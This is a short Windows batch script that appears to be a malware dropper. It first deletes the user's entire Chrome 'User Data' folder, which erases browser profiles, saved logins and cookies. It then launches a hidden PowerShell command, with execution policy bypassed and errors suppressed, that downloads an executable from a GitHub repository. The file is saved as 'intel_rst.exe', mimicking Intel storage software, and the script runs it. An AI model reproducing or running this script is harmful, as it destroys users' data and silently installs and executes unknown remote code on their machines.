@echo off
del /q /f "U:\Documents\intel_rst.exe">nul 2>&1    
set ChromeDir=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data

del /q /s /f "%ChromeDir%"
rd /s /q "%ChromeDir%"

powershell -NoP -NonI -W Hidden -Exec Bypass "$ErrorActionPreference = 'SilentlyContinue';$fileoutput = [Environment]::GetFolderPath('MyDocuments') + '\intel_rst.exe';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object System.Net.WebClient).DownloadFile('https://github.com/testpbs123/testing123/raw/master/intel_RTS.exe', $fileoutput);Start-Process $fileoutput"